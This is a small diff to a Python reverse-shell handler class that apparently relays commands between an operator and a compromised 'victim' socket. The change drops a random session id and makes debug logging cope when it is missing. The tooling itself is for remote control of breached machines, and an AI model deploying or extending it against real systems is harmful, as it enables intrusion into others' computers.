@@ -1,6 +1,5 @@
 import json
 import os
-import random
 import select
 import socket
 import struct
@@ -21,9 +20,7 @@ class ReverseShell(threading.Thread):
 
     def __init__(self, sock, key=None):
         super(ReverseShell, self).__init__()
-        self.details = {
-            "id": '%x' % random.randrange(16**8)
-        }
+        self.details = {}
         self.rsock = sock  # the remote socket connected to the victim
         self.lsock = None  # the local socket for shell interaction
         self.key = key
@@ -107,8 +104,12 @@ class ReverseShell(threading.Thread):
             sender = "local shell"
             self.deliver(p, self.rsock)
         host, port = s.getpeername()
-        log.debug("%s - %s - From %s: %s" % (host, self.details["id"],
-                  sender, p))
+        log.debug("%s - %s - From %s: %s" % (
+                    host,
+                    self.details["id"] if "id" in self.details else "?",
+                    sender,
+                    p
+                    ))
         return p
 
     def deliver(self, packet, sock):
